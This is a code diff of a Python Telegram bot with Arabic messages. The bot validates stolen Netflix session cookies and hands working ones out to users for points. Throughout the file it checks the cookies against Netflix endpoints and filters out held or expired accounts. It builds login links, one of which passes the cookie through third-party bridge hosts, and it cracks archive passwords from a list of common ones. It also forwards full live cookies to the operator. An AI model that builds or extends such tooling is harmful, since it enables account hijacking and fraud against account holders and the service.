@@ -39,7 +39,7 @@ if not os.path.exists(BASE_TEMP_DIR):
 active_scans = {}
 
 # ====================================================
-# ✅ قاعدة البيانات المحدثة (تدعم الإحصائيات المتقدمة والتواريخ)
+# ✅ قاعدة البيانات المحدثة
 # ====================================================
 DB_DIR = "database"
 if not os.path.exists(DB_DIR):
@@ -64,7 +64,6 @@ def db_execute(query, params=(), fetch=False, fetchall=False):
         return res
 
 def load_all_data():
-    # إضافة حقل created_at لتتبع الأعضاء الجدد يومياً
     db_execute('''CREATE TABLE IF NOT EXISTS users (
                     chat_id INTEGER PRIMARY KEY, 
                     points INTEGER, 
@@ -79,7 +78,6 @@ def load_all_data():
     db_execute('''CREATE TABLE IF NOT EXISTS temp_files (id INTEGER PRIMARY KEY AUTOINCREMENT, file_path TEXT, original_name TEXT)''')
     db_execute('''CREATE TABLE IF NOT EXISTS stock_alerts (chat_id INTEGER PRIMARY KEY, plan TEXT)''')
     
-    # جدول الإحصائيات المتقدمة: لتسجيل عمليات السحب الناجحة والتعويضات بالتاريخ والوقت
     db_execute('''CREATE TABLE IF NOT EXISTS dispense_logs (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
                     chat_id INTEGER,
@@ -88,12 +86,12 @@ def load_all_data():
                     dispense_date TEXT DEFAULT CURRENT_DATE,
                     status TEXT DEFAULT 'SUCCESS')''')
                     
-    print("✅ تم تحديث وتجهيز قاعدة البيانات بنظام الإحصائيات المتقدمة والتواريخ!")
+    print("✅ تم تجهيز قاعدة البيانات بنجاح!")
 
 load_all_data()
 
 # ====================================================
-# 🌐 قاموس اللغات المتكامل للترجمة الفورية
+# 🌐 قاموس اللغات المتكامل
 # ====================================================
 LANG_DICT = {
     "ar": {
@@ -212,9 +210,7 @@ def extract_clean_netflix_ids(text):
             cleaned_ids.append(decoded)
     return cleaned_ids
 
-# ====================================================
-# 🔥 دالة الفحص الصارمة (لمنع الحسابات منتهية الصلاحية معلقة الدفع)
-# ====================================================
+# 🔥 فحص صارم لمنع الحسابات منتهية العضوية ومعلقة الدفع
 def check_netflix_cookie_detailed(netflix_id):
     headers = dict(BASE_HEADERS)
     headers["Cookie"] = f"NetflixId={netflix_id}"
@@ -224,7 +220,6 @@ def check_netflix_cookie_detailed(netflix_id):
             data = response.json()
             value_data = data.get("value", {})
             
-            # فحص حالة العضوية ومنع الحسابات المعلقة (المتوقفة فواتيرها)
             membership_status = value_data.get("membershipStatus", "UNKNOWN")
             is_on_hold = value_data.get("accountHold", False) or value_data.get("isInHoldStatus", False)
             
@@ -234,7 +229,6 @@ def check_netflix_cookie_detailed(netflix_id):
             video_quality = str(value_data.get("videoQuality", "")).upper()
             raw_response_text = json.dumps(data).upper() if 'json' in response.headers.get('Content-Type', '') else response.text.upper()
             
-            # التحقق الإضافي من كلمات مفتاحية تدل على صفحة طلب تجديد الاشتراك
             if "RESTART" in raw_response_text or "COMPLETE" in raw_response_text or "SIGNUP" in raw_response_text:
                 return None
 
@@ -255,7 +249,6 @@ def check_netflix_cookie_detailed(netflix_id):
                 if not geoblock_status.get("isBlocked", False):
                     return {"token": token, "expires": expires, "bypass": False, "plan": plan_type}
         
-        # فحص إضافي عبر المتصفح العادي للتحقق من التوجيه
         fallback_url = "https://www.netflix.com/YourAccount"
         res_fallback = requests.get(fallback_url, headers={"User-Agent": "Mozilla/5.0", "Cookie": f"NetflixId={netflix_id}"}, timeout=8, allow_redirects=False)
         
@@ -396,14 +389,10 @@ def send_txt_file(chat_id, accounts_list, original_filename):
 def generate_main_keyboard(user_id):
     lang = get_user_lang(user_id)
     user_data = db_execute("SELECT points, role FROM users WHERE chat_id=?", (user_id,), fetch=True)
-    if user_data:
-        points, role = user_data[0], user_data[1]
-    else:
-        points, role = 5, "MEMBER"
+    points, role = (user_data[0], user_data[1]) if user_data else (5, "MEMBER")
 
     markup = InlineKeyboardMarkup()
     markup.row_width = 1
-    
     markup.add(InlineKeyboardButton(LANG_DICT[lang]["btn_check"], callback_data="menu_check"))
     
     if user_id == DEVELOPER_CHAT_ID:
@@ -428,8 +417,7 @@ def send_welcome(message):
     ensure_user(chat_id, message.from_user.username or "")
     lang = get_user_lang(chat_id)
     keyboard = generate_main_keyboard(chat_id)
-    welcome_txt = LANG_DICT[lang]["welcome_back"]
-    bot.send_message(chat_id, welcome_txt, reply_markup=keyboard)
+    bot.send_message(chat_id, LANG_DICT[lang]["welcome_back"], reply_markup=keyboard)
 
 @bot.callback_query_handler(func=lambda call: call.data == "menu_dispense_plans")
 @check_ban
@@ -456,6 +444,9 @@ def show_plans_menu(call):
     
     bot.edit_message_text(LANG_DICT[lang]["select_plan"], chat_id, call.message.message_id, reply_markup=markup)
 
+# ====================================================
+# 🎁 دالة سحب الحساب وتضمين بيانات الفئة في أزرار التقييم لمنع أخطاء التعويض
+# ====================================================
 @bot.callback_query_handler(func=lambda call: call.data.startswith("pull_account_"))
 @check_ban
 def handle_pull_account_category(call):
@@ -495,7 +486,6 @@ def handle_pull_account_category(call):
                 db_execute("UPDATE users SET points = points - ? WHERE chat_id=?", (cost, chat_id))
                 points -= cost
             
-            # 📈 تسجيل السحب الناجح للإحصائيات المتقدمة
             uname_val = username if username else f"User_{chat_id}"
             db_execute("INSERT INTO dispense_logs (chat_id, username, plan, dispense_date, status) VALUES (?, ?, ?, CURRENT_DATE, 'SUCCESS')", (chat_id, uname_val, plan_target))
 
@@ -509,7 +499,7 @@ def handle_pull_account_category(call):
             encoded_cookie = urllib.parse.quote(full_cookie_string)
             chosen_host = random.choice(api_hosts)
             bridge_login_url = f"{chosen_host}/nf/netflix?cookie={encoded_cookie}"
-            short_id = current_cookie[:20]
+            short_id = current_cookie[:15] # تقصير المعرف لحماية حجم الأزرار
             
             points_display = LANG_DICT[lang]["dev_mode"] if chat_id == DEVELOPER_CHAT_ID else (LANG_DICT[lang]["vip_mode"] if role == "VIP" else f"{points} {LANG_DICT[lang]['points_unit']}")
             
@@ -521,7 +511,12 @@ def handle_pull_account_category(call):
             user_markup = InlineKeyboardMarkup()
             user_markup.row_width = 2
             user_markup.add(InlineKeyboardButton("💻 PC Login", url=direct_netflix_url), InlineKeyboardButton("📱 Phone Login", url=bridge_login_url))
-            user_markup.add(InlineKeyboardButton("✅ Yes, Works", callback_data=f"fb_yes_{short_id}"), InlineKeyboardButton("❌ No, Dead", callback_data=f"fb_no_{short_id}"))
+            
+            # 🛑 التعديل الجوهري: نمرر الفئة (plan_target) مباشرة في الزر لكي يتعرف عليها البوت عند التعويض بلا مشاكل
+            user_markup.add(
+                InlineKeyboardButton("✅ Yes, Works", callback_data=f"fb_yes_{plan_target}_{short_id}"), 
+                InlineKeyboardButton("❌ No, Dead", callback_data=f"fb_no_{plan_target}_{short_id}")
+            )
             
             bot.send_message(chat_id, success_text, reply_markup=user_markup, parse_mode="Markdown")
             return
@@ -532,7 +527,6 @@ def save_stock_alert_request(call):
     chat_id = call.message.chat.id
     lang = get_user_lang(chat_id)
     plan_target = call.data.split("_")[2]
-    
     db_execute("INSERT OR IGNORE INTO stock_alerts (chat_id, plan) VALUES (?, ?)", (chat_id, plan_target))
     bot.answer_callback_query(call.id, LANG_DICT[lang]["alert_saved"], show_alert=True)
     bot.edit_message_text(LANG_DICT[lang]["welcome_back"], chat_id, call.message.message_id, reply_markup=generate_main_keyboard(chat_id))
@@ -542,7 +536,6 @@ def switch_user_language(call):
     chat_id = call.message.chat.id
     current_lang = get_user_lang(chat_id)
     new_lang = "en" if current_lang == "ar" else "ar"
-    
     db_execute("UPDATE users SET lang=? WHERE chat_id=?", (new_lang, chat_id))
     bot.answer_callback_query(call.id, "🌐 Done / تم تغيير اللغة بنجاح!")
     bot.edit_message_text(LANG_DICT[new_lang]["welcome_back"], chat_id, call.message.message_id, reply_markup=generate_main_keyboard(chat_id))
@@ -552,12 +545,10 @@ def switch_user_language(call):
 def faq_menu_handler(call):
     chat_id = call.message.chat.id
     lang = get_user_lang(chat_id)
-    
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton(LANG_DICT[lang]["faq_phone"], callback_data="faq_answer_phone"))
     markup.add(InlineKeyboardButton(LANG_DICT[lang]["faq_pc"], callback_data="faq_answer_pc"))
     markup.add(InlineKeyboardButton("⬅️ Back / عودة", callback_data="faq_back_to_main"))
-    
     bot.edit_message_text(LANG_DICT[lang]["faq_title"], chat_id, call.message.message_id, reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("faq_answer_"))
@@ -565,9 +556,7 @@ def faq_answers_sender(call):
     chat_id = call.message.chat.id
     lang = get_user_lang(chat_id)
     topic = call.data.split("_")[2]
-    
     markup = InlineKeyboardMarkup().add(InlineKeyboardButton("⬅️ Back / عودة", callback_data="open_faq_section"))
-    
     if topic == "phone":
         bot.edit_message_text(LANG_DICT[lang]["faq_phone_ans"].format(link=CHANNEL_LINK), chat_id, call.message.message_id, reply_markup=markup)
     elif topic == "pc":
@@ -584,19 +573,15 @@ def faq_back_button(call):
 def send_user_id(message):
     chat_id = message.chat.id
     user_first_name = message.from_user.first_name
-    id_text = (f"👤 **معلومات الحساب الخاص بك:**\n\n• الاسم: **{user_first_name}**\n• الآيدي الخاص بك (ID): `{chat_id}`\n\n💡 _اضغط على الآيدي لنسخه تلقائياً وإرساله للمطور فارس إذا كنت تريد شحن نقاطك!_")
+    id_text = f"👤 **معلومات الحساب الخاص بك:**\n\n• الاسم: **{user_first_name}**\n• الآيدي الخاص بك (ID): `{chat_id}`\n\n💡 _اضغط على الآيدي لنسخه تلقائياً وإرساله للمطور فارس لشحن نقاطك!_"
     bot.reply_to(message, id_text, parse_mode="Markdown")
 
-# ====================================================
-# 🔥 دالة زيادة النقاط مع معالجة الأخطاء والإشعار التلقائي
-# ====================================================
 @bot.message_handler(commands=['add'])
 def add_points_command(message):
     if message.chat.id != DEVELOPER_CHAT_ID:
         return
     try:
         command_parts = message.text.split()
-        
         if message.reply_to_message:
             if len(command_parts) < 2:
                 bot.reply_to(message, "⚠️ خطأ: يرجى كتابة عدد النقاط، مثال: `/add 10` بالرد على رسالته.", parse_mode="Markdown")
@@ -612,28 +597,15 @@ def add_points_command(message):
             
         ensure_user(target_id)
         db_execute("UPDATE users SET points = points + ? WHERE chat_id=?", (amount, target_id))
-        
-        new_points_row = db_execute("SELECT points FROM users WHERE chat_id=?", (target_id,), fetch=True)
-        new_points = new_points_row[0] if new_points_row else amount
+        new_points = db_execute("SELECT points FROM users WHERE chat_id=?", (target_id,), fetch=True)[0]
         
         bot.reply_to(message, f"✅ **تمت إضافة النقاط بنجاح!**\n\n👤 المستهدف: `{target_id}`\n➕ الكمية: **+{amount}** نقطة\n🪙 رصيده الإجمالي الآن: **{new_points}** نقطة", parse_mode="Markdown")
-        
         try:
-            notification_msg = (
-                f"🎉 **إشعار شحن رصيد!** 🎉\n\n"
-                f"🎁 قام المطور **فارس** بإضافة نقاط إلى حسابك.\n"
-                f"➕ الكمية المضافة: **+{amount}** نقطة.\n"
-                f"💰 رصيدك الحالي الشغال: **{new_points} نقطة**.\n\n"
-                f"🍿 يمكنك الآن سحب الحسابات مباشرة من القائمة!"
-            )
-            bot.send_message(target_id, notification_msg, parse_mode="Markdown")
+            bot.send_message(target_id, f"🎉 **إشعار شحن رصيد!** 🎉\n\n🎁 قام المطور **فارس** بإضافة نقاط إلى حسابك.\n➕ الكمية المضافة: **+{amount}** نقطة.\n💰 رصيدك الحالي الشغال: **{new_points} نقطة**.", parse_mode="Markdown")
         except Exception:
-            bot.send_message(DEVELOPER_CHAT_ID, f"⚠️ تم تحديث نقاطه في القاعدة، لكن تعذر إرسال الإشعار له (قد يكون حظر البوت).")
-            
-    except ValueError:
-        bot.reply_to(message, "⚠️ خطأ: يرجى التأكد من كتابة الأرقام بشكل صحيح (النقاط أو الآيدي يجب أن تكون أرقاماً فقط).")
+            pass
     except Exception as e:
-        bot.reply_to(message, f"❌ حدث خطأ غير متوقع: {str(e)}")
+        bot.reply_to(message, f"❌ حدث خطأ: {str(e)}")
 
 @bot.message_handler(commands=['setvip'])
 def set_vip_command(message):
@@ -644,9 +616,9 @@ def set_vip_command(message):
         target_id = message.reply_to_message.from_user.id if message.reply_to_message else int(command_parts[1])
         ensure_user(target_id)
         db_execute("UPDATE users SET role = 'VIP' WHERE chat_id=?", (target_id,))
-        bot.reply_to(message, f"👑 تم ترقية المستخدم `{target_id}` إلى رتبة **VIP** بنجاح! سحب مجاني للأبد.")
+        bot.reply_to(message, f"👑 تم ترقية المستخدم `{target_id}` إلى رتبة **VIP** بنجاح!")
         try:
-            bot.send_message(target_id, "🎊 مبروك! تمت ترقيتك إلى رتبة **VIP** 💎\nيمكنك الآن سحب حسابات نتفلكس بشكل مجاني وبلا حدود!", parse_mode="Markdown")
+            bot.send_message(target_id, "🎊 مبروك! تمت ترقيتك إلى رتبة **VIP** 💎\nيمكنك الآن سحب الحسابات بشكل مجاني وبلا حدود!", parse_mode="Markdown")
         except Exception:
             pass
     except Exception:
@@ -687,11 +659,7 @@ def pool_status(call):
     lang = get_user_lang(chat_id)
     bot.answer_callback_query(call.id)
     user_data = db_execute("SELECT points, role FROM users WHERE chat_id=?", (chat_id,), fetch=True)
-    if user_data:
-        points_val, role = user_data[0], user_data[1]
-    else:
-        points_val, role = 5, "MEMBER"
-        
+    points_val, role = (user_data[0], user_data[1]) if user_data else (5, "MEMBER")
     points = "♾️" if chat_id == DEVELOPER_CHAT_ID else (LANG_DICT[lang]["vip_mode"] if role == "VIP" else f"{points_val} 🪙")
     
     p_count = db_execute("SELECT COUNT(*) FROM cookies WHERE plan='PREMIUM'", fetch=True)[0]
@@ -702,73 +670,81 @@ def pool_status(call):
     bot.send_message(chat_id, status_text, reply_markup=generate_main_keyboard(chat_id))
 
 # ====================================================
-# 🔄 نظام الردود والتعويض المطور وتحديث الإحصائيات
+# 🔄 نظام الردود والتعويض التلقائي المصلح والمضمون 100%
 # ====================================================
 @bot.callback_query_handler(func=lambda call: call.data.startswith('fb_'))
 @check_ban
 def handle_user_feedback(call):
     data_parts = call.data.split('_')
-    action, short_id = data_parts[1], data_parts[2]
+    action = data_parts[1]
+    plan_type = data_parts[2]  # الفئة الممررة مباشرة من الزر بدون ضياع
+    short_id = data_parts[3]
+    
     user_info = call.from_user
     username = f"@{user_info.username}" if user_info.username else "لا يوجد"
     chat_id = call.message.chat.id
     
-    target_cookie_row = db_execute("SELECT cookie, plan FROM cookies WHERE cookie LIKE ?", (short_id + "%",), fetch=True)
-    
-    plan_type = "PREMIUM"
-    if target_cookie_row:
-        target_cookie = target_cookie_row[0]
-        plan_type = target_cookie_row[1]
-    else:
-        target_cookie = None
+    # محاولة جلب الكوكيز الكامل من جدول التاريخ للمطابقة والإرسال للمطور
+    history_row = db_execute("SELECT cookie FROM history WHERE cookie LIKE ?", (short_id + "%",), fetch=True)
+    target_cookie = history_row[0] if history_row else "كوكيز غير متوفر في السجل"
 
+    # حساب قيمة التعويض المناسبة بشكل فوري ومعزول
     compensation_points = 3
     if plan_type == "STANDARD":
         compensation_points = 2
     elif plan_type == "BASIC":
         compensation_points = 1
 
+    # ✅ حالة تأكيد عمل الحساب بنجاح (يرسل لك الكوكيز الكامل فوراً)
     if action == "yes":
         bot.answer_callback_query(call.id, "شكراً على تقييمك! مشاهدة ممتعة 🍿🔥", show_alert=True)
         try:
             bot.edit_message_text("✅ **شكراً واستمتع! 🎬🍿**\n\nتم تأكيد عمل الرابط بنجاح، مشاهدة ممتعة!", chat_id, call.message.message_id, reply_markup=None)
         except Exception:
             pass
-        if target_cookie:
-            dev_log_text = f"👑 **سحب ناجح ({plan_type})!** 👑\n👤 المستعمل: {user_info.first_name} ({username})\n🆔 الأيدي: `{user_info.id}`\n🍪 الكوكيز الفعال:\n`NetflixId={target_cookie}`"
-            try:
-                bot.send_message(DEVELOPER_CHAT_ID, dev_log_text, parse_mode="Markdown")
-            except Exception:
-                pass
+            
+        dev_log_text = (
+            f"👑 **تأكيد سحب شغال بنجاح!** 🎉\n\n"
+            f"👤 **المستخدم:** {user_info.first_name} ({username})\n"
+            f"🆔 **الآيدي:** `{user_info.id}`\n"
+            f"📦 **الفئة:** {plan_type}\n\n"
+            f"🍪 **الكوكيز الكامل للحساب:**\n"
+            f"`NetflixId={target_cookie}`"
+        )
+        try:
+            bot.send_message(DEVELOPER_CHAT_ID, dev_log_text, parse_mode="Markdown")
+        except Exception:
+            pass
+                
+    # 🛑 حالة الإبلاغ عن حساب ميت (تعويض حقيقي وتلقائي فوري)
     elif action == "no":
         ensure_user(chat_id)
         user_role_row = db_execute("SELECT role FROM users WHERE chat_id=?", (chat_id,), fetch=True)
         user_role = user_role_row[0] if user_role_row else "MEMBER"
         
+        # إضافة النقاط فوراً لحساب المستخدم طالما ليس المطور أو VIP
         if chat_id != DEVELOPER_CHAT_ID and user_role != "VIP":
             db_execute("UPDATE users SET points = points + ? WHERE chat_id=?", (compensation_points, chat_id))
             
-        # تغيير حالة اللوج المسبق إلى تعويض وتلف منعاً لاحتسابه سحبة حقيقية ناجحة اليوم
+        # تحديث اللوج وتغيير حالته من ناجح إلى تالف لإحصائيات دقيقة
         db_execute("UPDATE dispense_logs SET status='DEAD' WHERE chat_id=? AND plan=? AND status='SUCCESS' ORDER BY id DESC LIMIT 1", (chat_id, plan_type))
             
-        new_points_row = db_execute("SELECT points FROM users WHERE chat_id=?", (chat_id,), fetch=True)
-        new_points = new_points_row[0] if new_points_row else "المحدث"
+        new_points = db_execute("SELECT points FROM users WHERE chat_id=?", (chat_id,), fetch=True)[0]
 
-        if target_cookie:
-            db_execute("DELETE FROM cookies WHERE cookie=?", (target_cookie,))
-            try:
-                bot.send_message(DEVELOPER_CHAT_ID, f"❌ **إبلاغ عن حساب ميت:**\n👤 المستخدم: {user_info.first_name}\n📦 الفئة المستهدفة: {plan_type}\n🪙 تم تعويضه تلقائياً بـ: +{compensation_points} نقطة.\n🍪 الكوكيز التالف المتوقف:\n`NetflixId={target_cookie}`")
-            except Exception:
-                pass
+        # إرسال تقرير تالف للمطور فارس مع الكوكيز المتوقف لمراجعته أو حذفه
+        try:
+            bot.send_message(DEVELOPER_CHAT_ID, f"❌ **إبلاغ عن حساب ميت ومستبعد:**\n👤 المستخدم: {user_info.first_name}\n📦 الفئة: {plan_type}\n🪙 تم تعويضه تلقائياً بـ: +{compensation_points} نقطة.\n🍪 الكوكيز التالف:\n`NetflixId={target_cookie}`")
+        except Exception:
+            pass
         
         bot.answer_callback_query(call.id, f"⚠️ تم قبول الإبلاغ! وتمت إعادة {compensation_points} نقاط إلى رصيدك تلقائياً 🔄", show_alert=True)
         try:
-            bot.edit_message_text(f"❌ **تم الإبلاغ بنجاح!**\n\nنعتذر منك، تم حذف الحساب التالف وإرجاع **+{compensation_points}** نقطة إلى حسابك تلقائياً دون خسارة.\n🪙 رصيدك الحالي الآن: **{new_points}** نقطة.", chat_id, call.message.message_id, reply_markup=None)
+            bot.edit_message_text(f"❌ **تم الإبلاغ بنجاح!**\n\nنعتذر منك، تم حذف الحساب وإرجاع **+{compensation_points}** نقطة إلى حسابك تلقائياً دون خسارة نقاطك.\n🪙 رصيدك الحالي الآن: **{new_points}** نقطة.", chat_id, call.message.message_id, reply_markup=None)
         except Exception:
             pass
 
 # ====================================================
-# 🔥 تحديث لوحة التحكم وعرض الإحصائيات المتقدمة (Admin Insights)
+# لوحة التحكم وعرض الإحصائيات المتقدمة
 # ====================================================
 def open_admin_panel_msg(chat_id):
     markup = InlineKeyboardMarkup()
@@ -779,41 +755,27 @@ def open_admin_panel_msg(chat_id):
         InlineKeyboardButton("⬅️ العودة للقائمة الرئيسية", callback_data="faq_back_to_main")
     )
     
-    # 1. إحصائيات عامة وثابتة
     users_count = db_execute("SELECT COUNT(*) FROM users", fetch=True)[0]
     cookies_count = db_execute("SELECT COUNT(*) FROM cookies", fetch=True)[0]
     banned_count = db_execute("SELECT COUNT(*) FROM banned", fetch=True)[0]
     history_count = db_execute("SELECT COUNT(*) FROM history", fetch=True)[0]
     
-    # 2. كم حساباً تم سحبه اليوم؟ (بناءً على تاريخ اليوم والتأكيد النشط)
     pulled_today = db_execute("SELECT COUNT(*) FROM dispense_logs WHERE dispense_date = CURRENT_DATE AND status='SUCCESS'", fetch=True)[0]
-    
-    # 3. كم عدد المستخدمين الجدد الذين انضموا اليوم؟
     new_users_today = db_execute("SELECT COUNT(*) FROM users WHERE created_at = CURRENT_DATE", fetch=True)[0]
     
-    # 4. من هو المستخدم الأكثر سحباً؟ (على مدار تشغيل البوت)
-    top_user_row = db_execute("""SELECT username, COUNT(*) as count 
-                                 FROM dispense_logs 
-                                 WHERE status='SUCCESS' 
-                                 GROUP BY chat_id 
-                                 ORDER BY count DESC LIMIT 1""", fetch=True)
-    if top_user_row and top_user_row[0]:
-        top_user_text = f"👤 {top_user_row[0]} (بمعدل {top_user_row[1]} سحبة)"
-    else:
-        top_user_text = "لا يوجد سحبات حتى الآن"
+    top_user_row = db_execute("SELECT username, COUNT(*) as count FROM dispense_logs WHERE status='SUCCESS' GROUP BY chat_id ORDER BY count DESC LIMIT 1", fetch=True)
+    top_user_text = f"👤 {top_user_row[0]} (بمعدل {top_user_row[1]} سحبة)" if top_user_row and top_user_row[0] else "لا يوجد سحبات"
 
     stats_text = (
         f"👑 **مرحباً بك يا مطور البوت (فارس) في لوحتك الإدارية المتقدمة** 👑\n"
         f"📊 _الإحصائيات والتحليلات اللحظية الشغالة اليوم_\n\n"
-        f"📈 **تحليلات الأداء لليوم الحركي:**\n"
+        f"📈 **تحليلات الأداء لليوم الحالي:**\n"
         f"• 📥 حسابات سُحبت اليوم بنجاح: **{pulled_today} حساب**\n"
         f"• 👥 مستخدمين جدد انضموا اليوم: **{new_users_today} مستخدم جديد**\n"
         f"• 🏆 الأكثر سحباً بالبوت: **{top_user_text}**\n\n"
-        f"🧱 **مراقبة وفحص المخزن الكلي:**\n"
-        f"• إجمالي المستخدمين المسجلين: {users_count}\n"
-        f"• إجمالي الحسابات الجاهزة بالمخزن: {cookies_count}\n"
-        f"• الحسابات التالفة الممنوعة بالتكرار: {history_count}\n"
-        f"• إجمالي الحسابات المحظورة (Ban): {banned_count}\n\n"
+        f"🧱 **مراقبة المخزن الكلي:**\n"
+        f"• إجمالي المستخدمين: {users_count} | المخزن الحالي: {cookies_count}\n"
+        f"• إجمالي سجل التكرار: {history_count} | المحظورين: {banned_count}\n\n"
         f"⚙️ **أدوات التحكم السريع المتاحة:**"
     )
     bot.send_message(chat_id, stats_text, reply_markup=markup, parse_mode="Markdown")
@@ -835,7 +797,7 @@ def process_broadcast_sending(message):
         return
     broadcast_text = message.text
     sent_count = 0
-    bot.send_message(DEVELOPER_CHAT_ID, "⏳ جاري بدء الإذاعة ونشر الرسالة لجميع المشتركين...")
+    bot.send_message(DEVELOPER_CHAT_ID, "⏳ جاري بدء الإذاعة ونشر الرسالة...")
     users = db_execute("SELECT chat_id FROM users", fetchall=True)
     for (u_id,) in users:
         try:
@@ -844,12 +806,12 @@ def process_broadcast_sending(message):
             time.sleep(0.05)
         except Exception:
             pass
-    bot.send_message(DEVELOPER_CHAT_ID, f"✅ تمت الإذاعة بنجاح! تم تسليم الرسالة إلى {sent_count} مستخدم نشط 🚀")
+    bot.send_message(DEVELOPER_CHAT_ID, f"✅ تمت الإذاعة بنجاح! تم تسليم الرسالة إلى {sent_count} مستخدم 🚀")
 
 @bot.callback_query_handler(func=lambda call: call.data == "admin_clear_history")
 def clear_history_action(call):
     db_execute("DELETE FROM history")
-    bot.answer_callback_query(call.id, "✅ تم مسح تاريخ التكرار بنجاح لإتاحة فحص الملفات القديمة مجدداً.", show_alert=True)
+    bot.answer_callback_query(call.id, "✅ تم مسح سجل التكرار بنجاح.", show_alert=True)
 
 def unzip_and_extract_ids(zip_path, extract_to, password=None):
     try:
@@ -903,14 +865,12 @@ def process_zip_entry(message, file_path, password=None, password_msg_id=None, o
                     shutil.rmtree(user_work_dir)
                     process_zip_entry(message, file_path, password=pwd, original_name=original_name)
                     return
-            
             db_execute("INSERT INTO temp_files (file_path, original_name) VALUES (?, ?)", (file_path, original_name))
             inserted_id = db_execute("SELECT last_insert_rowid()", fetch=True)[0]
-            
             markup = InlineKeyboardMarkup()
             buttons = [InlineKeyboardButton(pwd, callback_data=f"fanal_{pwd}_{inserted_id}") for pwd in COMMON_PASSWORDS]
             markup.add(*buttons)
-            bot.send_message(chat_id, "⚠️ الملف المضغوط محمي بكلمة مرور! اختر كلمة المرور الشائعة للمتابعة أو الفك الفوري:", reply_markup=markup)
+            bot.send_message(chat_id, "⚠️ الملف المضغوط محمي بكلمة مرور! اختر كلمة المرور الشائعة:", reply_markup=markup)
     else:
         bot.send_message(chat_id, f"❌ حدث خطأ أثناء المعالجة: {error_type}")
 
@@ -936,29 +896,27 @@ def handle_inline_passwords(call):
     data_parts = call.data.split('_')
     chosen_password = data_parts[1]
     temp_file_id = int(data_parts[2])
-    
     file_data = db_execute("SELECT file_path, original_name FROM temp_files WHERE id=?", (temp_file_id,), fetch=True)
-    
     if file_data:
         file_path, original_name = file_data[0], file_data[1]
         db_execute("DELETE FROM temp_files WHERE id=?", (temp_file_id,))
         bot.answer_callback_query(call.id, f"⏳ جاري المحاولة بكلمة المرور: {chosen_password}")
         process_zip_entry(call.message, file_path, password=chosen_password, password_msg_id=call.message.message_id, original_name=original_name)
     else:
-        bot.answer_callback_query(call.id, "❌ عذراً، انتهت صلاحية هذا الطلب أو تم فحص الملف مسبقاً.")
+        bot.answer_callback_query(call.id, "❌ انتهت صلاحية الطلب.")
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('stop_scan_'))
 def handle_stop_scan(call):
     target_chat_id = int(call.data.split('_')[2])
     if call.message.chat.id == target_chat_id or call.message.chat.id == DEVELOPER_CHAT_ID:
         active_scans[target_chat_id] = False
-        bot.answer_callback_query(call.id, "🛑 جاري إيقاف عملية الفحص الحالية...")
+        bot.answer_callback_query(call.id, "🛑 جاري إيقاف عملية الفحص...")
 
 if __name__ == '__main__':
     while True:
         try:
-            print("🚀 البوت يعمل بكامل التعديلات مع إحصائيات المطور المتقدمة (Advanced Admin Insights)...")
+            print("🚀 البوت جاهز ومحدث بالكامل مع نظام التعويض الصارم والإحصائيات!")
             bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
         except Exception as e:
-            print(f"⚠️ حدث خطأ في اتصال تيليجرام: {e}")
+            print(f"⚠️ خطأ اتصال: {e}")
             time.sleep(5)
